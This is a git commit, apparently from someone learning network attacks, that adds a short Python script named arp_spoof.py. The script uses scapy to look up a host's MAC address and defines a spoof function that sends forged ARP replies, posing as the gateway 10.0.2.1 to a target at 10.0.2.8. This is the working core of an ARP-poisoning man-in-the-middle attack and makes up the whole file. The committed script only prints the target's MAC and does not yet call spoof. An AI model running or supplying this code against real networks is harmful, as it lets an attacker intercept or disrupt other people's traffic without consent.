88b4b385a59bc1c30e6be4a7dbf946dd01cf7465
Maffeys <matiusz98@gmail.com>
2020-01-08 16:54:30 -0500

    created arp_spoof stub

---
+++ arp_spoof.py
@@ -0,0 +1,21 @@
+#! /usr/bin/env python
+
+import scapy.all as scapy
+
+
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast_frame = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_packet = broadcast_frame / arp_request
+    answered = scapy.srp(arp_packet, timeout=1, verbose=False)[0]
+    return answered[0][1].hwsrc
+
+
+def spoof(target_ip, spoof_ip):
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
+    scapy.send(packet)
+
+
+target_ip = "10.0.2.8"
+spoof_ip = "10.0.2.1"
+print(get_mac("10.0.2.8"))
